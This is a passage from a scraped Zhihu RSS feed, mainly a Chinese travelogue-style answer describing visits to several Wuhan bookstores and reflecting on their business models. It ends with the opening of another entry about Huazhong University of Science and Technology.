src=\"https://pic4.zhimg.com/v2-a45d5e2bef187a7d5c700157975fc0f1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-a45d5e2bef187a7d5c700157975fc0f1\" data-watermark-src=\"v2-08fde7843942e55a0fe452fd473da1bc\" data-private-watermark-src=\"v2-81fdce07c057c86a41e382f4b62701c7\"></p>\n<p>因为时间关系，加之石头哥比较忙，我和阿威老师在境自在待了一会儿，就准备离开了。石头哥把我们送到电梯口，离开前，我问石头哥：</p>\n<p>“7年了，境自在书店能坚持到现在，除了情怀，还有什么？”</p>\n<p>石头哥回答说：</p>\n<p><b>“书店不是光靠情怀能存活下来的，需要思考经营啊。”</b></p>\n<p>是啊，有情怀当然没错，但做书店，本质上也是一门生意，想要活下来，当然得有属于自己的经营模式，我想，境自在从2014年坚持到现在，必然是形成了自己的书店经营模式的，我欣赏这样的书店人，祝石头哥的境自在书店发展得越来越自在~</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6896095c5f05f99d2a676c1cf02ae32b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-6896095c5f05f99d2a676c1cf02ae32b\" data-watermark-src=\"v2-89e9e4d6c5904c296c0e5901fed53d8e\" data-private-watermark-src=\"v2-09533a68c4f6b80f650fa6559cc907fa\"></p>\n<h2>07 鹅社书店</h2>\n<p>从境自在书店出来，已经是下午17点半，我和阿威老师两人已经有了些许倦意，加了让接下来的行程舒服些，我们叫了辆网约车。</p>\n<p>天色渐晚，汽车穿过汉口吉庆街夜市，经过咸安坊，在鄱阳街与青岛路的交汇口停下。这两条路的交汇口，有一处上世纪留存下来的老建筑：</p>\n<p>平和打包厂旧址。</p>\n<p>而鹅社书店，就在这里。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-abe7d47eb147fd5502f6d59103a6c4e9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"807\" data-watermark=\"watermark\" data-original-src=\"v2-abe7d47eb147fd5502f6d59103a6c4e9\" data-watermark-src=\"v2-3d359363a78347afd6948aba6730360e\" data-private-watermark-src=\"v2-ed838f75cd7c239db018bc63352cc70d\"></p>\n<p><b>该书店基本信息如下：</b></p>\n<p><b>名称：</b>鹅社书店艺术馆</p>\n<p><b>主营：</b>以人文社科类书籍为主，包括近期出版的新书、经典等。</p>\n<p><b>地址：</b>武汉市江岸区青岛路10号多牛世界B座1楼</p>\n<p>进入鹅社书店，首先迎接你的并不是书，而是各类文创产品，继续往里走，才到了售卖书籍的区域。</p>\n<p>鹅社书店用来摆放书籍的书架是木质的，但颜色上采取了青蓝色与白色这两种色调，两相对比映衬，不禁让人想到天鹅游于湖水之上的场景，给人以无限想象空间，而且也十分贴合鹅社书店中“鹅”这个主题，给整个书店塑造了一种沉静唯美的感觉。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-17f1862f1f2be193bdaf07adb1280681_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"809\" data-watermark=\"watermark\" data-original-src=\"v2-17f1862f1f2be193bdaf07adb1280681\" data-watermark-src=\"v2-6a45f25930b2be0acc7564b859957826\" data-private-watermark-src=\"v2-9516faefce14ecccb9a0120a0564de22\"></p>\n<p>除了卖书，鹅社书店还有一块专门用来进行艺术作品展示的区域，我并非艺术科班出身，对这些作品很难看得深入，但作为一个对艺术爱好者来说，我知道这些作品是作者用心创作的，这感觉不是用理性推导出来的，而是感性中催生的产物。</p>\n<p>……</p>\n<p><img src=\"https://pic4.zhimg.com/v2-3ed4bd0823452c9ba1f3c478a45fcd97_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"798\" data-watermark=\"watermark\" data-original-src=\"v2-3ed4bd0823452c9ba1f3c478a45fcd97\" data-watermark-src=\"v2-1456f689e14f4a9fd7d4d49617021284\" data-private-watermark-src=\"v2-11bf1d98130828bfc18df8b65df41147\"></p>\n<p>看我有些累了，阿威老师让我坐着休息会儿，他去接另一位在武汉的朋友。</p>\n<p>不一会儿，他们回来了，阿威老师旁边，多了一位小姐姐。</p>\n<p>小姐姐在市档案馆工作，名字里有个“倩”字，算是我的学姐，下文就以小倩学姐代称吧。</p>\n<p>据说，她是因为某次书店的活动与阿威老师结识，这次阿威老师来武汉，正好见面交流交流。</p>\n<p>甚好，又遇到了一个爱书之人，互联网把志趣相投的人联系到了一起。 </p>\n<h2>08 西西弗书店（江汉路店）</h2>\n<p>夜幕降临，小倩学姐请我和阿威老师吃了顿饭，饭后，我们在江汉路逛逛，既能聊聊天，又当消食了。</p>\n<p>其实我盘算着逛到江汉路地铁站，今天的行程就算告一段落了，结果走到M购物中心，我们又发现一家书店：</p>\n<p>西西弗书店（江汉路店）。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1edf6fd359cac42632e5ae8e47029582_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"808\" data-watermark=\"watermark\" data-original-src=\"v2-1edf6fd359cac42632e5ae8e47029582\" data-watermark-src=\"v2-ba1c8d69d2eafd7193f6f9bcd75b931d\" data-private-watermark-src=\"v2-41a30c8c39d6a8a7aaf439cd7a0e6ba8\"></p>\n<p><b>该书店基本信息如下：</b></p>\n<p><b>名称：</b>西西弗书店</p>\n<p><b>主营：</b>以人文社科类书籍为主，包括当季出版的新书、畅销书等。</p>\n<p><b>地址：</b>武汉市江汉区187号M购物中心B1层</p>\n<p>既然碰到了，那就进去逛逛吧。</p>\n<p>我曾去过武汉天地、六渡桥凯德广场的西西弗书店，其装修设计都差不多，不意外的，这家江汉路的西西弗也是如此，后来查了相关资料才晓得，全国的西西弗书店长得都差不多……</p>\n<p>虽然不像钟书阁那样在设计上风格迥异，但西西弗的英伦风格店门、复古风的橱窗摆设以及店内的标志缎带等，倒也十分耐看，也十分上镜。</p>\n<p>作为专业的书店培训师，阿威老师跟我和小倩学姐聊了聊西西弗书店的盈利模式：</p>\n<blockquote>别看西西弗书店表面上显得挺文艺，若论盈利模式，可是挺硬核的。<br><br>一家书店，想真正赚到钱，光谈情怀是没啥用的，于是，西西弗书店将零售业的玩法应用到了图书销售中，就像沃尔玛一样，将图书当成零售商品一样卖。<br><br><b>西西弗会搭建对每个门店客户群体进行分析的专业后台，根据他们的阅读习惯、消费能力等进行模型分析、用户画像，并对书籍进行标签化管理，反应到门店里书籍的摆放逻辑，就是以A、B、C为顺序排列的权重比例，这样的话，就能够帮助那些在阅读方面缺乏自己兴趣和判断力的顾客做选择，进而提高书籍卖出的效率。</b>\n</blockquote>\n<p><img src=\"https://pic3.zhimg.com/v2-d1c5e38f96e4e466064862d34e441741_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"807\" data-watermark=\"watermark\" data-original-src=\"v2-d1c5e38f96e4e466064862d34e441741\" data-watermark-src=\"v2-b3bfcdd62ec8614c69223a1552b7682f\" data-private-watermark-src=\"v2-f15f7794b2826136aa5a209f633dc6da\"></p>\n<p>听阿威老师讲完，我才忽地意识到：</p>\n<p>过去自己对书店行业的理解其实是颇为浅表的，只是单纯地看书店的外在设计，拍拍照、打打卡而已，但事实上，与“情怀”二字联系紧密的书店，本质上也是一种商业形态，作为一个爱逛书店的人，如果不能从更深层次的角度去理解书店，那我想，这种爱，实在是有些立不稳脚跟。</p>\n<p>……</p>\n<p>从西西弗书店出来，已是晚上21点多，江汉路上人依旧熙熙攘攘，而我和阿威老师、小倩学姐到了说再见的时候了。</p>\n<p>还会有机会再聚吧~！那天的逛书店经历着实让我难忘，因为互联网，我和机会和来自天南海北、素昧平生但志趣相投的人聚在一起，聊天交流，人间值得~</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4d8b94fc71b1e1ae9256ada1a38a0d39_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-4d8b94fc71b1e1ae9256ada1a38a0d39\" data-watermark-src=\"v2-a8faaa91ebb7f7ba5469abe55808a4b8\" data-private-watermark-src=\"v2-f3a822f8939c81014e8e213fbafc34d4\"></p>\n<h2>09 关于书店，我的一点思考</h2>\n<p>带大家聊了聊我和阿威老师逛过的8家书店，再聊聊我对书店的一点思考吧。</p>\n<p>下面这些话，是我去年9月份再逛中南路帝斯曼的时见鹿书店后写下的，反映了我对书店的一点思考，这里分享给大家：</p>\n<blockquote>今天工作弄完后，决定出门走走。租的房子附近有一家时见鹿书店，文艺范儿的，挺符合我胃口。本来漫无目的的散步变成了不由自主地去了书店。<br><br>书店很安静，诺大的空间里除了书柜和书柜上的书以外，你见不到啥密集的事物，人么？可以用三三两两来形容，我在装修考究、冷气不断的时见鹿里面逛了几圈，越发感觉奢侈，并且有一种隐隐的担忧——这家书店，还能活多久？<br><br>这些年我去过的书店不算少了，小时候常去那种堆满教辅资料的书店，包括新华书店，这种书店也卖其他书，但有意思的是，教辅似乎永远都崭新发亮，而旁的，则往往布满了灰尘。<br><br>高考后，我去了趟深圳，在华侨城哪里，我邂逅了第一家我觉得真正可以称之为“书店”的地方——旧天堂书店，就是那种很文艺范儿、很小众、又很有情调的书店。很多人都知道，线下书店里买书挺贵，但我比较感性，冲着这书店带给我的感觉，我没怎么犹豫花了一百块大洋入手了两本书，一本许倬云先生的《说中国》，一本诺奖经济学得主的文章集子。我以为我这样已经很不错了，谁知我旁边一老兄，拿了一车书来，一算账，一千多，我跪服！而且，我从他与店员的交谈中得知，这不是一回两回了，而是——常常。<br><br>这不叫书虫，这尼玛可以叫书痴了。<br><br>大学在武汉，或自己，或与二三好友，去过武汉各种有意思的书店，像昙华林的拾光书局、武锅附近的403艺术中心（暂时关闭）、楚河汉街的文华书局（已关闭）、汉阳龙阳大道及汉口江汉路的物外书店（江汉路店已关闭）、汉口儿童医院旁的卓尔书店、武广里的弘道书店、予果书店、汉口武汉天地及六渡桥凯德广场的西西弗书店，在凯德广场的西西弗，我和好友阿亮还亲眼见到了北大教授薛兆丰老师，并合照买书签了名，害，毕竟是一位靠卖一份经济学课就收获了超30万学员的男人啊……<br><br>谈回书店。<br><br>这些书店看多了，会有些审美疲劳，所谓的文艺范儿看多了也会觉得平常，但有一种隐隐的说不出来氛围萦绕在这类风格的书店里，让我对其又保持这探索了解的欲望。<br><br>2020年疫情，好友阿智给我发来消息说，汉街那家文华书城倒闭了……<br><br>我无言长久。<br><br>对于一些突发的、显得不怎么好的事情，我的第一反应常常是内心先开始遗憾，而表面上貌似很平静，渐渐的，心形合一，逐渐开始陷入一种纠结的迷惘中，这迷惘想来有些悲怆和天真，但却是我真实之感，何必隐藏？<br><br>事实上，很多精致的书店，往往都是在亏本运营的，现在买书，我想大多数人都转移阵地到了网上，毕竟，某东某当有满100减50、某宝有9.9包邮……是的，在书店买书的人不是没有，但相比从前，已经少很多了，大多数人到这种书店来，估计无非就是拍拍照、打打卡，喝喝咖啡，顺便发个朋友圈装下C，比如我……还有一部分就是看书的，对没错，仅仅就是看书，免费的空调、样书，优雅的环境它不香么？<br><br>我觉得这里是喜欢阅读之人的精神伊甸园、乌托邦，是喜欢拍照打卡人的“宝地”，更是装C之人的某个不错的“主场”，总之有很多吧……细细一想，还挺多挺杂的……<br><br>扯回我到开头。<br><br>夜深了，我离开了时见鹿。外面的街道依旧显得冰冷寂寥，偶尔闪过几量车来、蹦出几个人来，我独自走在街上，与书店渐行渐远，与租的房子越来越近……<br><br>总感觉，自己像在告别些什么，又在迎接些什么，不然，为何脑中突然又多出来了这对碎碎念呢？</blockquote>\n<p>……</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d2a572dea291994b65a69c851a61368f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"649\" data-rawheight=\"870\" data-watermark=\"watermark\" data-original-src=\"v2-d2a572dea291994b65a69c851a61368f\" data-watermark-src=\"v2-55b5668c37032bba15c47f277ab44312\" data-private-watermark-src=\"v2-c7e4bb908aff7f648e0b201255f15fbb\"></p>\n<p>上面的这段思考到现在已经有9个月了，我对书店的想法大体如此，和阿威老师那天逛了8家书店后，我的想法没有太多变化，反而进一步确认了这种想法的现实性。开书店的人，往往都是理想主义者，许多书店压根就不赚钱，但他们依旧选择坚守：</p>\n<p>有的背后有资本支撑，像卓尔集团旗下的卓尔书城、森林书店时见鹿，这个或许显得轻松一些；有的则是独立民营，诚如华师百草园、境自在书店，那种坚持应当更不易；还有许多旧书店，像泉之旧书社、集成古旧书店，更是要书店掌门人发自内心的热爱、以及耐得住寂寞……</p>\n<p>这么想似乎又显得有些悲观，但我又能体会到开书店的人身上有一股子英雄主义的气质，如此一来，书店行业看似前路茫茫，但又未来可期，为啥？</p>\n<p><b>因为这群人始终都存在，对书店的热爱未曾改变。</b></p>\n<p>以上。</p>\n<p>先写到这里吧。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6344e5413b2153d093588ca82b15e026_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"833\" data-watermark=\"watermark\" data-original-src=\"v2-6344e5413b2153d093588ca82b15e026\" data-watermark-src=\"v2-a2cd45523acf7ee64cf68e5650ea9475\" data-private-watermark-src=\"v2-0195805f8f573eb6675892d2c1b3b08c\"></p>\n<hr>\n<p>我是定安 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/e4bcc3448a5311df6f0960160e9e5e09\" data-hash=\"e4bcc3448a5311df6f0960160e9e5e09\" data-hovercard=\"p$b$e4bcc3448a5311df6f0960160e9e5e09\">@心定且安</a> ，点个关注不迷路~</p>\n<p>再次感谢 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/d7b3ecdf6092824e2705b59668950165\" data-hash=\"d7b3ecdf6092824e2705b59668950165\" data-hovercard=\"p$b$d7b3ecdf6092824e2705b59668950165\">@ChemX</a> 的邀请，以及谢谢 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/1714d49e5eda1253468e72e58d22eac5\" data-hash=\"1714d49e5eda1253468e72e58d22eac5\" data-hovercard=\"p$b$1714d49e5eda1253468e72e58d22eac5\">@知乎城市-武汉</a> 的认可~</p>\n<hr>\n<p>昨天回答发出去后，收到不少朋友的认可，希望看到更多有趣的书店，那我今天再接着补充两家~</p>\n<h2>10 几何书店</h2>\n<p>你听说过设计成洞穴样子的书店吗？</p>\n<p>今天它来了，它就是几何书店。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-479f310374c572229f6198f1a52238d6_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"865\" data-rawheight=\"642\" data-watermark=\"watermark\" data-original-src=\"v2-479f310374c572229f6198f1a52238d6\" data-watermark-src=\"v2-82161163c303544956f43827d2063f84\" data-private-watermark-src=\"v2-8b16a9a99ddbeb5d5d306c473948cf9c\"></p>\n<p><b>该书店基本信息如下：</b></p>\n<p><b>名称：</b>几何书店</p>\n<p><b>主营：</b>以人文社科类书籍为主，包括近期出版的新书、畅销书等</p>\n<p><b>地址：</b>武汉市武昌区和平大道750号绿地缤纷城购物中心5层</p>\n<p>有关这家书店的资料网上目前并不多，我只了解到这是一家来自青海西宁的连锁书店。之前有同学@XXX逛的是上海的几何书店，感谢他的分享~</p>\n<p>我逛的这家，则位于武汉市武昌区的绿地缤纷城，旁边就是那座修了11年还没修完的、被砍去一百多米的“平头哥”绿地中心。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-e65b41016b5e454751804143234ea146_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"865\" data-rawheight=\"647\" data-watermark=\"watermark\" data-original-src=\"v2-e65b41016b5e454751804143234ea146\" data-watermark-src=\"v2-aef2188a0ff5f2f6ed63164d723731df\" data-private-watermark-src=\"v2-1d53d5a8b5a835e3f66a04d3e8666d91\"></p>\n<p>知道这家书店，其实挺偶然的。一日我用高德地图输入“书店”这个关键词进行搜索，系统给我推荐了武汉最值得去的15家书店榜单，上面大部分我都有去过，翻着翻着，翻到这家几何书店，看到配图洞穴的装饰，我顿时眼前一亮，见多了以木质书架为主体的文艺范儿书店，不免有些审美疲劳，这家书店装饰成洞穴的样子，还是头一次见。</p>\n<p>OK，下一家书店就是它了。</p>\n<p>由于绿地缤纷城附近在修路，因此工地特别多、道路也比较拥堵，我跟着导航七拐八拐，好不容易才进了大门。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-45479b2bcabd553539a6b47ac81a62fb_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"866\" data-rawheight=\"647\" data-watermark=\"watermark\" data-original-src=\"v2-45479b2bcabd553539a6b47ac81a62fb\" data-watermark-src=\"v2-8ad137118dfda1c4630d455edc401adf\" data-private-watermark-src=\"v2-5d3fa9cdfbe9e1d92b4006b97b516033\"></p>\n<p>几何书店在第5层，书店入口处就被装饰成洞穴的样子，感觉这种设计很容易激发人们的探索欲。</p>\n<p>进入书店，内部更是几乎被洞穴的设计所覆盖，要我看，这家书店不如改名叫“洞穴书店”好了，又形象，还寓意在书中探索未知~</p>\n<p>书籍的摆放方面，跟其他很多连锁书店一样，是遵循着“新书、畅销书、其他细分类型的书、文创产品、咖啡茶饮”的逻辑排布的，买书的人并不很多，但在这里消费咖啡茶饮读书办公的人倒不少，这不禁让我感觉，现在的许多书店，其实更像是一个以书籍为主题的咖啡馆，人们为了更好的办公体验来到这里消费，从而维持了书店的经营，同时再辅以文创产品的售卖，打造一座城市的文化聚集地，成为一张为城市代言的重要名片。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-678348bcf1f3c9985ba3acb0af008487_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"867\" data-rawheight=\"647\" data-watermark=\"watermark\" data-original-src=\"v2-678348bcf1f3c9985ba3acb0af008487\" data-watermark-src=\"v2-ba7006a432e77722d0ad76775492c9fa\" data-private-watermark-src=\"v2-490aa28c64c2250bbd6d91555ace512a\"></p>\n<p>我觉得这是条不错的发展之路，<b>因为就线下书店而言，单纯的卖书肯定打不过线上那些动不动就满100减50的网络书商，于是线下书店必须要将“体验”作为其重要的破局点，</b>这是线上书店难以企及的。我近来逛的无论是西西弗书店、钟书阁，还是转型了的新华书店、现在逛的几何书店，都在朝这个方向发展，从目前开店扩张的角度来看，我觉得效果还不错，值得想做书店的朋友参考借鉴。</p>\n<p>以上是我这次书店漫步的经历和一点思考~</p>\n<h2>11 德芭与彩虹书店（西北湖店）</h2>\n<p>德芭与彩虹书店在武汉已经开了许久了，但2018年的10月31日，因为一些原因，它在武汉天地的门店闭店，时隔一年多，这家书店在西北湖公园再次开张营业。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-909078094252a6210f0f4c90b4ad2a30_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"867\" data-rawheight=\"638\" data-watermark=\"watermark\" data-original-src=\"v2-909078094252a6210f0f4c90b4ad2a30\" data-watermark-src=\"v2-a8a7a72f15d8a749bfc972b756abb3fe\" data-private-watermark-src=\"v2-568b65f8519cbd54d224ca07dd2e27b9\"></p>\n<p><b>该书店基本信息如下：</b></p>\n<p><b>名称：</b>德芭与彩虹书店（西北湖店）</p>\n<p><b>主营：</b>以人文社科类书籍为主，包括近期出版的新书、畅销书等</p>\n<p><b>地址：</b>武汉市江汉区北湖街道黄孝西路好世纪大酒店西北侧</p>\n<p>西北湖的这家德芭与彩虹书店不算很大，藏书不多，我当时去的时候，里面也没啥人。算起来，就是前台两三个负责书店管理的店员，以及趴在桌上写作业的学生。有趣的是，这里并没有消费才能入座的要求，整体显得很自由。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1201de03d53ffb5580f26e196e9a5328_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"865\" data-rawheight=\"647\" data-watermark=\"watermark\" data-original-src=\"v2-1201de03d53ffb5580f26e196e9a5328\" data-watermark-src=\"v2-9cc9d9fc758b5f218f52e6d1e4dfb970\" data-private-watermark-src=\"v2-24b156c18c5aabffa43d8f711d8d8724\"></p>\n<p>说起这家书店，算是很多武汉人的青春记忆。下面，我和大家聊聊这家书店创始人的故事。</p>\n<p>这家书店的创始人叫陈嫚，1978年10月生于武汉，自幼就十分喜欢与书为伴，她没有受过高等教育，从事的职业是插画师。在开这家书店之前，她是武汉大大小小书店的常客，喜欢看书淘书。</p>\n<p>2009年，陈嫚在豆瓣上发起了一个同城活动，想“给所有孤独的人开一家温暖的好书店”。当年7月，德芭与彩虹书店在武汉市武昌区街道口珞珈山大厦开张，随后，武汉天地也有了这家书店的身影。</p>\n<p>在豆瓣的网友和线下的读者口口相传下，这家书店成为武汉最为知名的民营书店之一，被很多人称为“武汉最温暖的书店”、“像家一样的书店”。</p>\n<p>初次听到“德芭与彩虹”这个名字，很多人会觉得奇怪，我也一样。很长一段时间，我总是把它与彩虹糖联系起来，我以为这是个卖糖果的门店，但陈嫚取的这个名字，其实有她自己独特的想法。“德芭”是麦兜动画里一只小猫的名字，而“彩虹”则意为美好的生活。之所以起这个名字，是希望能与那些传统老旧的书店加以区别，希望呈现给大众一家清新、美好、吸引人的全新书店。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d577d14e930a43ebf38a48f039e78e40_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"866\" data-rawheight=\"646\" data-watermark=\"watermark\" data-original-src=\"v2-d577d14e930a43ebf38a48f039e78e40\" data-watermark-src=\"v2-7732f786207d0ce8edb1b845554337a1\" data-private-watermark-src=\"v2-2cce61af2a7692b6cb217e3dd8b19669\"></p>\n<p>陈嫚为这家书店做出了许多努力：</p>\n<p>首先，这家书店被定位为一家温暖的优选书店，为爱书人提供舒适的阅读空间，出售书籍、咖啡和杂货，另外还有自助出版和订书服务，全年无休。除此之外，德芭与彩虹还为多家单位和个人提供家具订制、图书采购和装修设计等服务，为多家出版社提供设计、制作和推广服务，鼓励个人藏书、推广藏书票文化。</p>\n<p>这些都逐渐地变成了现实，而像“武汉花友会”、“插画师交流会”、“图书漂流”、“春天读书会”等活动也陆续展开，它们都源自陈嫚的创意。</p>\n<p>可惜的是，因为罹患癌症，尽管经过了两次手术和八次化疗，陈嫚还是没挺住。2014年10月，她安静地离开了这个世界，当时并没有经过什么宣传。2016年3月12日，卓尔集团董事长阎志在社交平台发表了一篇文章《怀念一位书店人》，这才有不少人知道陈嫚去世的消息，网友们纷纷留言悼念这位年轻的书店人，怀念那“城市上空那盏夜灯”。</p>\n<p>陈嫚走后，德芭与彩虹书店就完全由她的老公曾刚打理了。曾刚说，如今实体书店经营很难，而专注于品质阅读和深度阅读的德芭与彩虹就更是如此了。他说自己的妻子陈嫚知道这是一条少有人走的路，但只要用心和坚持，就一定会赢得读者和市场的认同。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-0e0ec473b632b1c05f9a31f6525be58a_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"867\" data-rawheight=\"649\" data-watermark=\"watermark\" data-original-src=\"v2-0e0ec473b632b1c05f9a31f6525be58a\" data-watermark-src=\"v2-b015f872438ad411f5bea8d35e6565ab\" data-private-watermark-src=\"v2-e546222b8a718affd94405bee855ddbe\"></p>\n<p>我觉得陈嫚做书店，早已经不是将其当作一份工作，甚至也不停留在一番事业，而是一个读书人、爱书人的终极使命，这种使命感让德芭与彩虹得以坚持下去，并获得越来越多人的认可。</p>\n<p>陈嫚是2013年10月被确诊为癌症晚期的。手术后，陈嫚依旧会在身体许可的条件下去书店走走看看，这是她理想的现实投射，而她的生命也因德芭与彩虹而得以延续。</p>\n<p>暂先写到这里，希望德芭与彩虹书店越来越好。</p>\n<hr>\n<p>我是定安 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/e4bcc3448a5311df6f0960160e9e5e09\" data-hash=\"e4bcc3448a5311df6f0960160e9e5e09\" data-hovercard=\"p$b$e4bcc3448a5311df6f0960160e9e5e09\">@心定且安</a>，感谢 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/1714d49e5eda1253468e72e58d22eac5\" data-hash=\"1714d49e5eda1253468e72e58d22eac5\" data-hovercard=\"p$b$1714d49e5eda1253468e72e58d22eac5\">@知乎城市-武汉</a> 的转发，我们下家书店见~</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/xin-ding-qie-an?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">心定且安</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/485888458/answer/2119215445?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">3 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/25702206?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">武汉有没有比较好的书店？</a><br><a href=\"http://www.zhihu.com/question/299816767?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">成都为什么书店越来越少？你们在哪买漫画？</a><br>\n","link":"http://www.zhihu.com/question/485888458/answer/2119215445?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"你所在的城市有哪些堪称「景点」的大学？","date":"2021-09-24 08:25:16","description":"\n<p>在武汉，80多所高校密集扎堆</p>\n<p>其中传说不少，比如</p>\n<p>有一所大学曾以男女比例极不均衡出名</p>\n<p>江湖人称 “关山口男子职业技术学院”</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-4619af110a4e03de5a3c0c1b9afef354_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"719\" data-rawheight=\"479\" data-watermark=\"original\" data-original-src=\"v2-4619af110a4e03de5a3c0c1b9afef354\" data-watermark-src=\"v2-e354261659f7c5730a450807aafe17d5\" data-private-watermark-src=\"v2-5f7b2caffd3eb7dacfcecbc0d2ed3f57\"></p>\n<p><br></p>\n<p>尽管大家每天都离不开的微信</p>\n<p>就诞生在它的毕业生手上</p>\n<p>网球女王娜姐退役后也选择去这里读书</p>\n<p>坊间尽是它和武大相爱相杀的段子</p>\n<p>但，它在社交媒体上却特别低调神秘</p>\n<p><br></p>\n<p>藏在喻家山脚下默默耕耘半个多世纪</p>\n<p>又高调叱咤中国互联网创业圈风口浪尖</p>\n<p>没有东湖、樱花、老建筑的浪漫传说</p>\n<p>却自带雄赳赳气昂昂的学霸光环</p>\n<p>它的名字叫做</p>\n<p><i><b>“ 华 中 科 技 大 学  ”</b></i></p>\n<p><br></p>\n<p><b>▁▁▁▁</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-55984439915f1176c2ecd3601e66a732_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"667\" data-watermark=\"original\" data-original-src=\"v2-55984439915f1176c2ecd3601e66a732\" data-watermark-src=\"v2-697e71d00ab9b2b07154abae540d5468\" data-private-watermark-src=\"v2-04db80e9a40875e1ae92310ced070570\"></p>\n<p><br></p>\n<p><b><i>“ 传说男女比例7：1，直男气场遍地 ”</i></b></p>\n<p><br></p>\n<p>大概是出身理工科的原因</p>\n<p>华科许多角落都透露着典型的“直男癌”气息</p>\n<p><br></p>\n<p>比如</p>\n<p>华科的道路横平竖直，建筑四四方方</p>\n<p>教学楼、宿舍、食堂命名</p>\n<p>清一色的东西南北和一二三四排列组合</p>\n<p>耿直朴素，不加修饰</p>\n<p>比如，东九、西十二、西一食堂、南一舍</p>\n<p><br></p>\n<p>在武汉，可能也只有在华科校园里</p>\n<p>才能听到标准的“北京式问路”</p>\n<p>“往南走200米，然后朝东拐”</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-2617af5e5ecba24f9dead9be7ccc1ea9_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"964\" data-rawheight=\"548\" data-watermark=\"original\" data-original-src=\"v2-2617af5e5ecba24f9dead9be7ccc1ea9\" data-watermark-src=\"v2-b50863b696a8cd31e6a3d866ea70f95f\" data-private-watermark-src=\"v2-06e248e03c2c5cb8c2085849f3e244cd\"></p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-4f73aacb5517a2f7d267912937164e3b_720w.webp?rss\" data-caption=\"△ // 华科图书馆当年的设计图纸（上图）。空中俯瞰，华科老图书馆就是两个巨大的“工”字，可以说是非常耿直的设计了。\" data-size=\"normal\" data-rawwidth=\"1049\" data-rawheight=\"699\" data-watermark=\"original\" data-original-src=\"v2-4f73aacb5517a2f7d267912937164e3b\" data-watermark-src=\"v2-8f414accd051cd5c5c7a7eaba1b05a61\" data-private-watermark-src=\"v2-7b1af16c8420184792cca42bb220189e\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-2dd130c4addfec81e3f242607d1dcdd9_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"719\" data-watermark=\"original\" data-original-src=\"v2-2dd130c4addfec81e3f242607d1dcdd9\" data-watermark-src=\"v2-bb18381be462ed93daf8e4ccbc3de7bc\" 